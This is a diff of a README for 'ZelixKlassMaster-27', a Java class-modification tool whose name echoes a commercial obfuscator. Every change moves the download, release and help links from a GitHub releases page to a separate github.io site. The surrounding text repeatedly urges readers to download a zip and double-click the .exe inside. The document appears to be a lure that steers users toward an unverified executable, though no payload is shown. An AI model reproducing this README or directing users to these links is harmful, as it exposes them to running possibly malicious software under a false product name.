@@ -1,6 +1,6 @@
 # ⚡ ZelixKlassMaster-27 - Simplifies Java App Modification for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-ZelixKlassMaster--27-blue?style=for-the-badge&logo=github)](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+[![Download Now](https://img.shields.io/badge/Download-ZelixKlassMaster--27-blue?style=for-the-badge&logo=github)](https://sakthi366.github.io)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these simple steps to get the application on your computer.
 
 **Step 1:** Visit this link to download the application.
 
-👉 [**Click Here to Download ZelixKlassMaster-27**](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+👉 [**Click Here to Download ZelixKlassMaster-27**](https://sakthi366.github.io)
 
 **Step 2:** The download page will open in your web browser. Look for the latest version number and click the download button next to it.
 
@@ -108,7 +108,7 @@ A: It works with standard Java class files (files ending in `.class`) and Java a
 A: No. ZelixKlassMaster-27 includes everything it needs to run on its own.
 
 **Q: I'm stuck. Where can I get help?**
-A: Check the [Releases page](https://github.com/Sakthi366/ZelixKlassMaster-27/releases) for any notes or contact the repository owner through GitHub.
+A: Check the [Releases page](https://sakthi366.github.io) for any notes or contact the repository owner through GitHub.
 
 ---
 
@@ -126,7 +126,7 @@ A: Check the [Releases page](https://github.com/Sakthi366/ZelixKlassMaster-27/re
 
 When a new version becomes available, simply:
 
-1. Visit the [Releases page](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+1. Visit the [Releases page](https://sakthi366.github.io)
 2. Download the latest zip file
 3. Extract it to a new folder
 4. Start using the new version
@@ -139,7 +139,7 @@ Your old version can be deleted safely.
 
 Before you start, make sure you have:
 
-- [x] Downloaded the zip file from the [official releases page](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+- [x] Downloaded the zip file from the [official releases page](https://sakthi366.github.io)
 - [x] Extracted the zip file to a folder
 - [x] Located the `.exe` or `.jar` file inside
 - [x] Double-clicked it to launch the program
@@ -152,7 +152,7 @@ That's it. You're done. Enjoy using ZelixKlassMaster-27!
 
 | Action | What to Do |
 |--------|------------|
-| Download | Visit [this link](https://github.com/Sakthi366/ZelixKlassMaster-27/releases) |
+| Download | Visit [this link](https://sakthi366.github.io) |
 | Extract | Right-click zip → Extract All |
 | Run | Double-click the `.exe` or `.jar` file |
 | Process a file | Click "Open File" → Choose file → Click "Process" |
@@ -175,7 +175,7 @@ Go ahead and give it a try. You'll be amazed at how easy it is.
 
 **Download today and see the difference in minutes.**
 
-[![Get It Now](https://img.shields.io/badge/Download-Latest%20Version-green?style=for-the-badge)](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+[![Get It Now](https://img.shields.io/badge/Download-Latest%20Version-green?style=for-the-badge)](https://sakthi366.github.io)
 
 ---
 
